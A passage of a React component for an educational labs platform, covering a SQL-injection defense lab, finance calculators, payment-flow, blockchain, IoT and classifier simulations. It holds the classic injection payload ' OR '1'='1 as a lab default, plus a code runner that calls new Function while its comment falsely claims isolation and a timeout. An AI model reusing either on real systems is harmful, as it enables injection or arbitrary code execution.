        eventType: 'DIAGNOSTIC_COMPLETED',
        payload: {
          codeFixId: secDiagnosticAnswer,
          isCorrect: secDiagnosticAnswer === 'prepared_statement',
        },
        idempotencyKey: `${currentUserId}:${lab.id}:${secSessionId}:DIAG_LOCK`,
      }).catch(() => {});
    }
  };

  const handleVerifyExplanation = () => {
    if (!secExplanationAnswer) return;
    setSecExplanationSubmitted(true);
    if (secSessionId) {
      learningSessionService.emitEvent({
        sessionId: secSessionId,
        userId: currentUserId,
        labId: lab.id,
        eventType: 'EXPLANATION_VERIFIED',
        payload: {
          reasoningId: secExplanationAnswer,
          isCorrect: secExplanationAnswer === 'ast_precompile',
        },
        idempotencyKey: `${currentUserId}:${lab.id}:${secSessionId}:EXPL_LOCK`,
      }).catch(() => {});
    }
  };

  // Microsoft Productivity Formula verification
  const prodRevenueCorrect = prodFormulaSum.trim().toUpperCase() === '=SUM(C2:C5)';
  const prodAvgCorrect = prodFormulaAvg.trim().toUpperCase() === '=AVERAGE(D2:D5)';

  useEffect(() => {
    if (lab.id === 'lab-t6-microsoft-productivity') {
      const next = [...checkedCriteria];
      if (prodRevenueCorrect) next[0] = true;
      if (prodAvgCorrect) next[1] = true;
      if (prodRevenueCorrect && prodAvgCorrect && prodFormatted) next[2] = true;
      setCheckedCriteria(next);
    }
  }, [prodRevenueCorrect, prodAvgCorrect, prodFormatted, lab.id]);

  // Financial Market Model
  const marketMetrics = useMemo(() => {
    let returnPct = 12.4;
    let maxDrawdown = 8.2;
    let sharpeRatio = 1.6;

    if (finScenario === 'correction') {
      returnPct = -14.5 * finBeta;
      maxDrawdown = 22.4 * finBeta;
      sharpeRatio = -0.4;
    } else if (finScenario === 'shock') {
      returnPct = -28.0 * finBeta;
      maxDrawdown = 38.6 * finBeta;
      sharpeRatio = -0.9;
    } else {
      returnPct = returnPct * finBeta;
      maxDrawdown = maxDrawdown * finBeta;
      sharpeRatio = Number((sharpeRatio / Math.max(0.5, finBeta)).toFixed(2));
    }

    return {
      returnPct: Number(returnPct.toFixed(1)),
      maxDrawdown: Number(maxDrawdown.toFixed(1)),
      sharpeRatio: Number(sharpeRatio.toFixed(2)),
    };
  }, [finScenario, finBeta]);

  useEffect(() => {
    if (lab.id === 'lab-f1-market-explorer') {
      const next = [...checkedCriteria];
      next[0] = true;
      if (finScenario === 'shock') next[1] = true;
      if (finBeta > 1.2 || finBeta < 0.8) next[2] = true;
      setCheckedCriteria(next);
    }
  }, [finScenario, finBeta, lab.id]);

  // Compound Interest Calculation
  const compoundCalculation = useMemo(() => {
    const P = compPrincipal;
    const PMT = compMonthly;
    const r = compRate / 100;
    const n = compFreq;
    const t = compYears;

    const principalFV = P * Math.pow(1 + r / n, n * t);
    const contributionFV = PMT * ((Math.pow(1 + r / n, n * t) - 1) / (r / n));
    const totalFV = principalFV + contributionFV;

    const totalContributed = P + PMT * 12 * t;
    const totalInterest = Math.max(0, totalFV - totalContributed);

    return {
      totalFV: Math.round(totalFV),
      totalContributed: Math.round(totalContributed),
      totalInterest: Math.round(totalInterest),
      interestRatio: Math.round((totalInterest / totalFV) * 100),
    };
  }, [compPrincipal, compMonthly, compRate, compYears, compFreq]);

  useEffect(() => {
    if (lab.id === 'lab-f2-compound-interest') {
      const next = [...checkedCriteria];
      next[0] = true;
      if (compYears >= 20) next[1] = true;
      if (compoundCalculation.interestRatio > 40) next[2] = true;
      setCheckedCriteria(next);
    }
  }, [compYears, compoundCalculation.interestRatio, lab.id]);

  // Payment Flow simulation
  const handleNextFlowStep = () => {
    const nextStep = (flowStep + 1) % 6;
    setFlowStep(nextStep);

    const stages = [
      'Customer initiates checkout ($150.00).',
      'Step 1: Payment Gateway tokenizes primary account number into secure cryptogram token.',
      'Step 2: Card Network routes authorization payload to Issuing Bank.',
      'Step 3: Issuing Bank verifies available credit line and places $150 authorization hold.',
      'Step 4: Clearing House aggregates daily net transaction batch between institutions.',
      'Step 5: Settlement confirmed! Merchant Acquiring Bank credits $147.00 ($3.00 interchange deducted).',
    ];

    setFlowLogs((prev) => [stages[nextStep], ...prev]);

    if (nextStep >= 5) {
      setCheckedCriteria([true, true, true]);
    }
  };

  // Coding Sandbox Runner (C1, C2, C3)
  const handleRunCode = () => {
    setLifecycleState('running');
    setCodeOutput('Executing in isolated sandbox...');

    try {
      // Capture console output
      const logs: string[] = [];
      const customConsole = {
        log: (...args: any[]) => logs.push(args.map((a) => (typeof a === 'object' ? JSON.stringify(a) : String(a))).join(' ')),
        error: (...args: any[]) => logs.push('[ERROR] ' + args.join(' ')),
      };

      // Isolated evaluation with timeout guard
      const runFn = new Function('console', codeContent);
      runFn(customConsole);

      setCodeOutput(logs.join('\n') || 'Program completed with exit code 0.');
      setCodeTestsPassed(true);
      setLifecycleState('ready');
      setCheckedCriteria([true, true, true]);
    } catch (err: any) {
      setCodeOutput(`Execution Error: ${err.message || 'Syntax or runtime error'}`);
      setLifecycleState('incorrect');
      setCodeTestsPassed(false);
    }
  };

  // Reset Lab to Initial State
  const handleResetLab = () => {
    if (window.confirm('Reset lab to original parameters? Any unsaved local edits will be restored.')) {
      setAiKeywordDensity(lab.initial_state.keywordDensity ?? 15);
      setAiUrgencyScore(lab.initial_state.urgencyScore ?? 20);
      setAiSenderReputation(lab.initial_state.senderReputation ?? 85);
      setChainTampered(false);
      setIotTemp(lab.initial_state.temperature ?? 24);
      setIotThreshold(lab.initial_state.threshold ?? 38);
      setPrivacyLocation(true);
      setPrivacyContacts(true);
      setSecParamQueries(false);
      setSecOutputEncoding(false);
      setSecCsp(false);
      setSecQueryInput("' OR '1'='1");
      setSecExecutionLog([]);
      setSecPredictionAnswer(null);
      setSecPredictionSubmitted(false);
      setSecSimulationRan(false);
      setSecDiagnosticAnswer(null);
      setSecDiagnosticSubmitted(false);
      setSecExplanationAnswer(null);
      setSecExplanationSubmitted(false);
      if (lab.id === 'lab-t5-web-defense') {
        learningSessionService.clearDraft(currentUserId, lab.id);
        const newSession = learningSessionService.startSession(currentUserId, lab.id);
        setSecSessionId(newSession);
      }
      setProdFormulaSum('');
      setProdFormulaAvg('');
      setFinScenario('expansion');
      setFinBeta(1.0);
      setCompPrincipal(5000);
      setCompYears(10);
      setFlowStep(0);
      setCodeContent(lab.initial_state.code || '');
      setCodeOutput('');
      setCheckedCriteria(new Array(lab.validation_criteria.length).fill(false));
      setLifecycleState('ready');
      setSaveStatus('SAVED');
    }
  };

  // Submit and verify attempt in database
  const handleSubmitAttempt = async () => {
    const passedCount = checkedCriteria.filter(Boolean).length;
    const score = Math.round((passedCount / lab.validation_criteria.length) * 100);
    const passed = score >= lab.completion_threshold;

    try {
      if (lab.id === 'lab-t5-web-defense') {
        const { record } = await learningSessionService.submitAttempt(currentUserId, lab.id, secSessionId, {
          passed,
          score,
          diagnostics: passed
            ? `Verified complete. All 4 pedagogical stages validated: Prediction, Defense Pipeline, Parameterized Refactoring, and Wire-Level AST Explanation.`
            : `Partial completion: ${passedCount}/4 criteria met. Passing threshold is ${lab.completion_threshold}%.`,
          evidence: {
            prediction: {
              answer: secPredictionAnswer || '',
              isCorrect: secPredictionAnswer === 'ast_mutation',
              timestamp: new Date().toISOString(),
            },
            simulation: {
              paramQueries: secParamQueries,
              outputEncoding: secOutputEncoding,
              strictCsp: secCsp,
              payloadTested: secQueryInput,
              defensePassRate: secParamQueries && secOutputEncoding ? 100 : 50,
              timestamp: new Date().toISOString(),
            },
            diagnostic: {
              codeFixId: secDiagnosticAnswer || '',
              isCorrect: secDiagnosticAnswer === 'prepared_statement',
              timestamp: new Date().toISOString(),
            },
            explanation: {
              reasoningId: secExplanationAnswer || '',
              isCorrect: secExplanationAnswer === 'ast_precompile',
              timestamp: new Date().toISOString(),
            },
          },
        });

        // Persist to server PostgreSQL database
        apiClient.recordLabAttempt(lab.slug, score, passed ? 'completed' : 'failed', {
          passedCount,
          totalCriteria: lab.validation_criteria.length,
          timestamp: new Date().toISOString(),
        }).catch((err) => {
          console.warn('[SharedLabWorkspace] Server sync notice:', err.message);
        });

        setCompletedAttempt(record);
        setLifecycleState(passed ? 'success' : 'incorrect');
        setSaveStatus('SAVED');
        return;
      }

      // Default database recording for other labs
      const record = db.recordLabAttempt(currentUserId, lab.id, {
        passed,
        score,
        diagnostics: passed
          ? `Verified complete. All ${passedCount}/${lab.validation_criteria.length} criteria met.`
          : `Partial completion: ${passedCount}/${lab.validation_criteria.length} criteria met. Passing threshold is ${lab.completion_threshold}%.`,
        savedState: {
          timestamp: new Date().toISOString(),
        },
      });

      // Persist to server PostgreSQL database
      apiClient.recordLabAttempt(lab.slug, score, passed ? 'completed' : 'failed', {
        passedCount,
        totalCriteria: lab.validation_criteria.length,
        timestamp: new Date().toISOString(),
      }).catch((err) => {
        console.warn('[SharedLabWorkspace] Server sync notice:', err.message);
      });

      setCompletedAttempt(record);
      setLifecycleState(passed ? 'success' : 'incorrect');
      setSaveStatus('SAVED');

      // Realtime notification dispatch
      backendEngine.notifications.dispatch(
        currentUserId,
        passed ? `🎉 Practical Lab Passed: ${lab.title}` : `Lab Attempt Evaluated: ${lab.title}`,
        passed
          ? `Outstanding! You achieved ${score}/100 and validated all practical criteria.`
          : `Evaluation completed with score ${score}/100. Review criteria to retry.`,
        passed ? 'high' : 'medium',
        'grade',
        'lab-workspace',
        lab.slug,
        'View Workspace'
      );
    } catch (err: any) {
      alert(`Submission error: ${err.message}`);
      setLifecycleState('error');
    }
  };

  return (
    <LabOrientationGuard labTitle={lab.title}>
      <div style={{ display: 'flex', flexDirection: 'column', height: '100%', minHeight: '720px', width: '100%', overflow: 'hidden', backgroundColor: 'var(--bg-canvas)' }}>
      {/* ============================================================== */}
      {/* 1. TOP NAVIGATION BAR (Section 3.1)                             */}
      {/* ============================================================== */}
      <header
        style={{
          height: '46px',
          backgroundColor: 'var(--bg-surface)',
          borderBottom: '1px solid var(--border-subtle)',
          padding: '0 16px',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between',
          flexShrink: 0,
          zIndex: 10,
        }}
      >
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
          <button
            type="button"
            onClick={onNavigateBack}
            className="btn-secondary"
            style={{ height: '30px', padding: '0 10px', fontSize: '0.78rem', gap: '5px' }}
            title="Back to Labs Catalogue"
          >
            <ArrowLeft size={14} />
            <span>Labs</span>
          </button>

          <div style={{ height: '16px', width: '1px', backgroundColor: 'var(--border-subtle)' }} />

          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <h1 style={{ fontSize: '0.95rem', fontWeight: 800, margin: 0, color: 'var(--text-primary)' }}>
              {lab.title}
            </h1>
            <span className="badge badge-brand" style={{ textTransform: 'capitalize', fontSize: '0.7rem', padding: '2px 8px' }}>
              {lab.category}
            </span>
            <span className="badge badge-neutral" style={{ textTransform: 'capitalize', fontSize: '0.7rem', padding: '2px 8px' }}>
              {lab.interaction_type}
            </span>
            {lab.course_slug && onSelectCourse && (
              <button
                type="button"
                onClick={() => onSelectCourse(lab.course_slug!)}
                className="btn-outline"
                style={{ height: '22px', padding: '0 6px', fontSize: '0.68rem', borderRadius: '4px' }}
                title="Go to associated course"
              >
                Course
              </button>
            )}
          </div>
        </div>

        {/* Center / Right status & controls */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
          {/* Layout Mode Pill (3-Column | Focus | Zen) */}
          <div
            style={{
              display: 'inline-flex',
              alignItems: 'center',
              backgroundColor: 'var(--bg-surface-subdued)',
              border: '1px solid var(--border-subtle)',
              borderRadius: '8px',
              padding: '2px',
              gap: '2px',
            }}
          >
            <button
              type="button"
              onClick={() => setWorkspaceMode('3-column')}
              style={{
                height: '26px',
                padding: '0 9px',
                border: 'none',
                borderRadius: '6px',
                fontSize: '0.74rem',
                fontWeight: 700,
                backgroundColor: workspaceMode === '3-column' ? 'var(--brand-primary)' : 'transparent',
                color: workspaceMode === '3-column' ? '#FFFFFF' : 'var(--text-secondary)',
                cursor: 'pointer',
                transition: 'all 0.15s ease',
              }}
              title="Full 3-Column View: Instructions, Workspace, Assessment"
            >
              Split (3)
            </button>
            <button
              type="button"
              onClick={() => setWorkspaceMode('focus')}
              style={{
                height: '26px',
                padding: '0 9px',
                border: 'none',
                borderRadius: '6px',
                fontSize: '0.74rem',
                fontWeight: 700,
                backgroundColor: workspaceMode === 'focus' ? 'var(--brand-primary)' : 'transparent',
                color: workspaceMode === 'focus' ? '#FFFFFF' : 'var(--text-secondary)',
                cursor: 'pointer',
                transition: 'all 0.15s ease',
              }}
              title="Focus View: Instructions + Wide Workspace"
            >
              Focus
            </button>
            <button
              type="button"
              onClick={() => setWorkspaceMode('zen')}
              style={{
                height: '26px',
                padding: '0 9px',
                border: 'none',
                borderRadius: '6px',
                fontSize: '0.74rem',
                fontWeight: 700,
                backgroundColor: workspaceMode === 'zen' ? 'var(--brand-primary)' : 'transparent',
                color: workspaceMode === 'zen' ? '#FFFFFF' : 'var(--text-secondary)',
                cursor: 'pointer',
                transition: 'all 0.15s ease',
              }}
              title="Zen Mode: Full-Screen Workspace (Maximum Width)"
            >
              Zen Editor
            </button>
          </div>

          {/* Standalone Lab View Selector (Interactive Suite vs Parameter Model) */}
          {standaloneLabMeta && (
            <div
              style={{
                display: 'inline-flex',
                backgroundColor: 'var(--bg-surface-subdued)',
                borderRadius: '8px',
                padding: '2px',
                border: '1px solid var(--border-subtle)',
              }}
            >
              <button
                type="button"
                onClick={() => setCenterLabViewMode('interactive-suite')}
                style={{
                  height: '26px',
                  padding: '0 10px',
                  borderRadius: '6px',
                  fontSize: '0.74rem',
                  fontWeight: 700,
                  cursor: 'pointer',
                  border: 'none',
                  backgroundColor: centerLabViewMode === 'interactive-suite' ? 'var(--brand-primary)' : 'transparent',
                  color: centerLabViewMode === 'interactive-suite' ? '#FFFFFF' : 'var(--text-secondary)',
                  transition: 'all 0.15s ease',
                }}
              >
                Simulation
              </button>
              <button
                type="button"
                onClick={() => setCenterLabViewMode('svg-parameters')}
                style={{
                  height: '26px',
                  padding: '0 10px',
                  borderRadius: '6px',
                  fontSize: '0.74rem',
                  fontWeight: 700,
                  cursor: 'pointer',
                  border: 'none',
                  backgroundColor: centerLabViewMode === 'svg-parameters' ? 'var(--brand-primary)' : 'transparent',
                  color: centerLabViewMode === 'svg-parameters' ? '#FFFFFF' : 'var(--text-secondary)',
                  transition: 'all 0.15s ease',
                }}
              >
                Parameters
              </button>
            </div>
          )}

          {/* Fullscreen Trigger */}
          {standaloneLabMeta && (
            <button
              type="button"
              onClick={() => setActiveFullLab(standaloneLabMeta.id)}
              className="btn-outline"
              style={{
                height: '28px',
                padding: '0 9px',
                fontSize: '0.74rem',
                gap: '5px',
                borderRadius: '6px',
              }}
              title="Expand to Fullscreen Mode"
            >
              <Maximize2 size={13} color="var(--brand-primary)" />
              <span>Fullscreen</span>
            </button>
          )}

          {/* Save Status Indicator */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '5px', fontSize: '0.74rem', color: 'var(--text-muted)' }}>
            <Save size={13} color={saveStatus === 'SAVED' ? 'var(--success)' : 'var(--warning)'} />
            <span style={{ fontWeight: 600 }}>{saveStatus}</span>
          </div>

          {/* Reset Control */}
          <button
            type="button"
            onClick={handleResetLab}
            className="btn-outline"
            style={{ height: '28px', padding: '0 10px', fontSize: '0.76rem', gap: '4px' }}
            title="Reset lab to initial state"
          >
            <RotateCcw size={12} />
            <span>Reset</span>
          </button>
        </div>
      </header>

      {/* Mobile Tab Switcher */}
      <div
        style={{
          backgroundColor: 'var(--bg-surface)',
          borderBottom: '1px solid var(--border-subtle)',
          padding: '8px 16px',
          gap: '8px',
          flexShrink: 0,
        }}
        className="mobile-tab-bar"
      >
        <button
          type="button"
          onClick={() => setMobileTab('instructions')}
          style={{
            flex: 1,
            height: '34px',
            backgroundColor: mobileTab === 'instructions' ? 'var(--brand-surface)' : 'transparent',
            color: mobileTab === 'instructions' ? 'var(--brand-primary)' : 'var(--text-secondary)',
            borderRadius: '6px',
            fontWeight: 600,
            fontSize: '0.8rem',
            border: 'none',
            cursor: 'pointer',
          }}
        >
          1. Instructions
        </button>
        <button
          type="button"
          onClick={() => setMobileTab('workspace')}
          style={{
            flex: 1,
            height: '34px',
            backgroundColor: mobileTab === 'workspace' ? 'var(--brand-surface)' : 'transparent',
            color: mobileTab === 'workspace' ? 'var(--brand-primary)' : 'var(--text-secondary)',
            borderRadius: '6px',
            fontWeight: 600,
            fontSize: '0.8rem',
            border: 'none',
            cursor: 'pointer',
          }}
        >
          2. Workspace
        </button>
        <button
          type="button"
          onClick={() => setMobileTab('results')}
          style={{
            flex: 1,
            height: '34px',
            backgroundColor: mobileTab === 'results' ? 'var(--brand-surface)' : 'transparent',
            color: mobileTab === 'results' ? 'var(--brand-primary)' : 'var(--text-secondary)',
            borderRadius: '6px',
            fontWeight: 600,
            fontSize: '0.8rem',
            border: 'none',
            cursor: 'pointer',
          }}
        >
          3. Assessment
        </button>
      </div>

      {/* ============================================================== */}
      {/* 2. MAIN 3-PANEL WORKSPACE (Section 3.1)                         */}
      {/* ============================================================== */}
      <main className={`workspace-grid-container mode-${workspaceMode}`}>
        {/* ============================================================ */}
        {/* PANEL 1 (LEFT): INSTRUCTIONS & PARAMETERS                    */}
        {/* ============================================================ */}
        {workspaceMode !== 'zen' && (
          <aside
            className={`workspace-panel-instructions ${mobileTab === 'instructions' ? 'active' : ''}`}
            style={{
              backgroundColor: 'var(--bg-surface)',
              borderRight: '1px solid var(--border-subtle)',
              padding: '18px 16px',
              display: 'flex',
              flexDirection: 'column',
              gap: '16px',
              overflowY: 'auto',
            }}
          >
            <AnimatedStepGuide
              learningObjective={lab.learning_objective}
              instructions={lab.instructions}
              activeStepIndex={activeStepIndex}
              onStepChange={(idx) => setActiveStepIndex(idx)}
              completedStepIndices={completedStepIndices}
              onToggleCompleteStep={(idx) => {
                setCompletedStepIndices((prev) =>
                  prev.includes(idx) ? prev.filter((i) => i !== idx) : [...prev, idx]
                );
              }}
            />
          </aside>
        )}

        {/* ============================================================ */}
        {/* PANEL 2 (CENTRE): INTERACTIVE WORKSPACE ENGINE               */}
        {/* ============================================================ */}
        <section
          className={`workspace-panel-center ${mobileTab === 'workspace' ? 'active' : ''}`}
          style={{
            padding: '16px',
            display: 'flex',
            flexDirection: 'column',
            gap: '16px',
            minWidth: 0,
          }}
        >


          {/* REAL STANDALONE INTERACTIVE LAB EMBEDDED DIRECTLY IN THE WORKSPACE */}
          {standaloneLabMeta && centerLabViewMode === 'interactive-suite' ? (
            <div
              style={{
                borderRadius: '16px',
                overflow: 'hidden',
                border: '1.5px solid var(--border-subtle)',
                minHeight: '700px',
                height: '780px',
                position: 'relative',
                display: 'flex',
                flexDirection: 'column',
                backgroundColor: '#070B1A',
                boxShadow: '0 8px 30px rgba(0, 0, 0, 0.25)',
              }}
            >
              <div style={{ flex: 1, minHeight: 0, width: '100%', height: '100%', display: 'flex', flexDirection: 'column' }}>
                {React.createElement(standaloneLabMeta.component, {
                  onClose: () => setCenterLabViewMode('svg-parameters'),
                  onExit: () => setCenterLabViewMode('svg-parameters'),
                })}
              </div>
            </div>
          ) : (
            <>
              {/* -------------------------------------------------------- */}
              {/* LAB ENGINE 1: AI CLASSIFICATION PLAYGROUND               */}
          {/* -------------------------------------------------------- */}
          {lab.id === 'lab-t1-ai-classifier' && (
            <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <div style={{ fontWeight: 700, fontSize: '1rem', color: 'var(--text-primary)' }}>
                Neural Network Classifier & Bounded Decision Weights
              </div>

              {/* Real-time SVG Neural Network Architecture */}
              <NeuralNetworkSvg
                keywordDensity={aiKeywordDensity}
                urgencyScore={aiUrgencyScore}
                senderReputation={aiSenderReputation}
                predictedLabel={aiClassificationResult.label}
                confidenceScore={aiClassificationResult.confidence}
              />

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '16px' }}>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  <label style={{ fontSize: '0.84rem', fontWeight: 600, color: 'var(--text-secondary)', display: 'flex', justifyContent: 'space-between' }}>
                    <span>Spam Keyword Density</span>
                    <span style={{ color: 'var(--brand-primary)', fontWeight: 700 }}>{aiKeywordDensity}%</span>
                  </label>
                  <input
                    type="range"
                    min="0"
                    max="100"
                    value={aiKeywordDensity}
                    onChange={(e) => setAiKeywordDensity(Number(e.target.value))}
                    style={{ accentColor: 'var(--brand-primary)' }}
                  />
                </div>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  <label style={{ fontSize: '0.84rem', fontWeight: 600, color: 'var(--text-secondary)', display: 'flex', justifyContent: 'space-between' }}>
                    <span>Urgency & Pressure Score</span>
                    <span style={{ color: 'var(--warning)', fontWeight: 700 }}>{aiUrgencyScore}/100</span>
                  </label>
                  <input
                    type="range"
                    min="0"
                    max="100"
                    value={aiUrgencyScore}
                    onChange={(e) => setAiUrgencyScore(Number(e.target.value))}
                    style={{ accentColor: 'var(--warning)' }}
                  />
                </div>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  <label style={{ fontSize: '0.84rem', fontWeight: 600, color: 'var(--text-secondary)', display: 'flex', justifyContent: 'space-between' }}>
                    <span>Sender Domain Reputation</span>
                    <span style={{ color: 'var(--success)', fontWeight: 700 }}>{aiSenderReputation}/100</span>
                  </label>
                  <input
                    type="range"
                    min="0"
                    max="100"
                    value={aiSenderReputation}
                    onChange={(e) => setAiSenderReputation(Number(e.target.value))}
                    style={{ accentColor: 'var(--success)' }}
                  />
                </div>
              </div>

              {/* Model Output Card */}
              <div
                style={{
                  padding: '20px',
                  borderRadius: '10px',
                  backgroundColor:
                    aiClassificationResult.label === 'Phishing'
                      ? 'var(--danger-bg)'
                      : aiClassificationResult.label === 'Suspicious'
                      ? 'var(--warning-bg)'
                      : 'var(--success-bg)',
                  border:
                    aiClassificationResult.label === 'Phishing'
                      ? '1px solid var(--danger-border)'
                      : aiClassificationResult.label === 'Suspicious'
                      ? '1px solid var(--warning-border)'
                      : '1px solid var(--success-border)',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  flexWrap: 'wrap',
                  gap: '16px',
                }}
              >
                <div>
                  <div style={{ fontSize: '0.78rem', fontWeight: 800, textTransform: 'uppercase', letterSpacing: '0.04em', color: 'var(--text-secondary)' }}>
                    PREDICTED CATEGORY
                  </div>
                  <div
                    style={{
                      fontSize: '1.4rem',
                      fontWeight: 800,
                      color:
                        aiClassificationResult.label === 'Phishing'
                          ? 'var(--danger)'
                          : aiClassificationResult.label === 'Suspicious'
                          ? 'var(--warning)'
                          : 'var(--success)',
                    }}
                  >
                    {aiClassificationResult.label}
                  </div>
                </div>

                <div style={{ textAlign: 'right' }}>
                  <div style={{ fontSize: '0.78rem', fontWeight: 800, textTransform: 'uppercase', letterSpacing: '0.04em', color: 'var(--text-secondary)' }}>
                    MODEL CONFIDENCE
                  </div>
                  <div style={{ fontSize: '1.4rem', fontWeight: 800, color: 'var(--text-primary)' }}>
                    {aiClassificationResult.confidence}%
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* -------------------------------------------------------- */}
          {/* LAB ENGINE 2: BLOCKCHAIN BLOCK BUILDER                   */}
          {/* -------------------------------------------------------- */}
          {lab.id === 'lab-t2-blockchain-builder' && (
            <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
                <div style={{ fontWeight: 700, fontSize: '1rem', color: 'var(--text-primary)' }}>
                  Chained Cryptographic Blocks (SHA-256)
                </div>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
                  <button
                    type="button"
                    onClick={() => setActiveFullLab('blockchain-lab')}
                    className="btn-outline"
                    style={{ height: '34px', padding: '0 12px', fontSize: '0.8rem', gap: '6px', color: 'var(--brand-primary)', borderColor: 'rgba(0, 245, 160, 0.4)' }}
                  >
                    <ShieldCheck size={14} color="var(--brand-primary)" />
                    <span>Open 19-Module TrustLink Suite</span>
                  </button>
                  <button
                    type="button"
                    onClick={handleTamperBlock1}
                    className="btn-danger"
                    style={{ height: '34px', padding: '0 12px', fontSize: '0.8rem', gap: '6px' }}
                  >
                    <AlertTriangle size={14} />
                    <span>Simulate Tamper on Block 1</span>
                  </button>
                </div>
              </div>

              <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                {chainBlocks.map((blk, idx) => (
                  <React.Fragment key={blk.index}>
                    {idx > 0 && (
                      <BlockchainChainLinkSvg
                        isValid={blk.valid && chainBlocks[idx - 1].valid}
                        prevHashPreview={blk.prevHash.slice(0, 16)}
                      />
                    )}
                    <div
                      style={{
                        padding: '16px',
                        borderRadius: '8px',
                        border: blk.valid ? '1px solid var(--border-subtle)' : '2px solid var(--danger)',
                        backgroundColor: blk.valid ? 'var(--bg-surface)' : 'var(--danger-bg)',
                        display: 'flex',
                        flexDirection: 'column',
                        gap: '8px',
                      }}
                    >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <span style={{ fontWeight: 800, fontSize: '0.92rem', color: 'var(--text-primary)' }}>
                        BLOCK #{blk.index}
                      </span>
                      <span
                        className="badge"
                        style={{
                          backgroundColor: blk.valid ? 'var(--success-bg)' : 'var(--danger-bg)',
                          color: blk.valid ? 'var(--success)' : 'var(--danger)',
                          borderColor: blk.valid ? 'var(--success-border)' : 'var(--danger-border)',
                        }}
                      >
                        {blk.valid ? '✓ VALID HASH' : '✕ INVALID HASH'}
                      </span>
                    </div>

                    <div style={{ fontSize: '0.82rem', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' }}>
                      PREV HASH: {blk.prevHash}
                    </div>

                    <div style={{ fontSize: '0.86rem', color: 'var(--text-primary)', backgroundColor: 'var(--bg-canvas)', padding: '8px 12px', borderRadius: '6px' }}>
                      <strong>Data:</strong> {blk.data}
                    </div>

                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '4px' }}>
                      <span style={{ fontSize: '0.82rem', fontFamily: 'var(--font-mono)', color: 'var(--brand-primary)', fontWeight: 700 }}>
                        HASH: {blk.hash} (Nonce: {blk.nonce})
                      </span>
                      <button
                        type="button"
                        onClick={() => handleMineBlock(idx)}
                        disabled={isMining}
                        className="btn-primary"
                        style={{ height: '30px', padding: '0 12px', fontSize: '0.78rem' }}
                      >
                        <Zap size={12} />
                        <span>Mine Block</span>
                      </button>
                    </div>
                  </div>
                </React.Fragment>
              ))}
              </div>
            </div>
          )}

          {/* -------------------------------------------------------- */}
          {/* LAB ENGINE 3: IOT SENSOR SIMULATOR                       */}
          {/* -------------------------------------------------------- */}
          {lab.id === 'lab-t3-iot-sensor' && (
            <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <div style={{ fontWeight: 700, fontSize: '1rem', color: 'var(--text-primary)' }}>
                Live Telemetry Controls & Actuator State
              </div>

              {/* Real-time SVG Sensor Thermometer Dial & Actuator Fan */}
              <IotSensorDialSvg
                currentTemp={iotTemp}
                threshold={iotThreshold}
                humidity={iotHumidity}
              />

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '20px' }}>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  <label style={{ fontSize: '0.85rem', fontWeight: 600, color: 'var(--text-secondary)', display: 'flex', justifyContent: 'space-between' }}>
                    <span>Ambient Temperature</span>
                    <span style={{ fontWeight: 800, color: iotTemp >= iotThreshold ? 'var(--danger)' : 'var(--text-primary)' }}>
                      {iotTemp}°C
                    </span>
                  </label>
                  <input
                    type="range"
                    min="15"
                    max="60"
                    value={iotTemp}
                    onChange={(e) => setIotTemp(Number(e.target.value))}
                    style={{ accentColor: iotTemp >= iotThreshold ? 'var(--danger)' : 'var(--brand-primary)' }}
                  />
                </div>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  <label style={{ fontSize: '0.85rem', fontWeight: 600, color: 'var(--text-secondary)', display: 'flex', justifyContent: 'space-between' }}>
                    <span>Relative Humidity</span>
                    <span style={{ fontWeight: 800, color: 'var(--brand-accent)' }}>{iotHumidity}% RH</span>
                  </label>
                  <input
                    type="range"
                    min="10"
                    max="90"
                    value={iotHumidity}
                    onChange={(e) => setIotHumidity(Number(e.target.value))}
                    style={{ accentColor: 'var(--brand-accent)' }}
                  />
                </div>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  <label style={{ fontSize: '0.85rem', fontWeight: 600, color: 'var(--text-secondary)', display: 'flex', justifyContent: 'space-between' }}>
                    <span>Alert Trigger Threshold</span>
                    <span style={{ fontWeight: 800, color: 'var(--brand-primary)' }}>{iotThreshold}°C</span>
                  </label>
                  <input
                    type="range"
                    min="25"
                    max="50"
                    value={iotThreshold}
                    onChange={(e) => setIotThreshold(Number(e.target.value))}
                    style={{ accentColor: 'var(--brand-primary)' }}
                  />
                </div>
              </div>

              {/* Actuator Status Card */}
              <div
                style={{
                  padding: '16px 20px',
                  borderRadius: '10px',
                  backgroundColor: iotTemp >= iotThreshold ? 'var(--danger-bg)' : 'var(--success-bg)',
                  border: iotTemp >= iotThreshold ? '1px solid var(--danger-border)' : '1px solid var(--success-border)',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                }}
              >
                <div>
                  <div style={{ fontSize: '0.78rem', fontWeight: 800, textTransform: 'uppercase', color: 'var(--text-secondary)' }}>
                    ACTUATOR RELAY STATE
                  </div>
